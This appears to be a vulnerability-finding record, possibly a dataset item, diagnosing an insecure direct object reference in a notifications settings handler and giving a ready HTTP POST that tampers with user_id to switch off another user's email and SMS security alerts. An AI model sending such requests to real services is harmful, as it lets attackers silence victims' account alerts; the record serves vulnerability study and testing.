diagnosis: The form handler accepts user_id from an HTML form POST payload and updates preferences based on that value. It verifies the session is authenticated, but fails to check user_id == session_user.id. An attacker can tamper with hidden form fields to disable security and alert notifications on other users' accounts.
exploit_request:
POST /settings/notifications HTTP/1.1
Host: portal.example.com
Cookie: session=active_user_sess
Content-Type: application/x-www-form-urlencoded

user_id=108&email_alerts=false&sms_alerts=false
